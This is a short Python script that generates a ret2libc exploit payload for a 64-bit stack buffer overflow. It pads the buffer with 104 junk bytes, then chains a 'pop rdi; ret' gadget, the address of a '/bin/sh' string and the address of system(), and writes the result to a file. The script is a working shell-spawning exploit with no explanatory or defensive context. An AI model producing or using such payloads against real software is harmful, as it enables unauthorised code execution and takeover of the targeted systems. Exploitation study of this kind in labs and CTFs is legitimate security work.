#!/usr/bin/env python

import sys
from struct import *

if len(sys.argv) <= 3:
    print("\tUsage: Addr of `pop;pop;ret` for rdi, addr of `/bin/sh` string, addr of system function\n")
    print("\tEx: python genret2libc.py 0x00000004006a3 0x4006ff 0x7ffff7a5ac40\n")
    exit()
    
poprdiret = int(sys.argv[1][2:],16)
binsh_str = int(sys.argv[2][2:],16)
systemfunc = int(sys.argv[3][2:],16)

buf = ""
buf += "A"*104                              # junk
buf += pack("<Q", poprdiret)                # pop rdi; ret;
buf += pack("<Q", binsh_str)                # pointer to "/bin/sh" gets popped into rdi
buf += pack("<Q", systemfunc)               # address of system()

f = open("ret2libc.txt", "w")
f.write(buf)
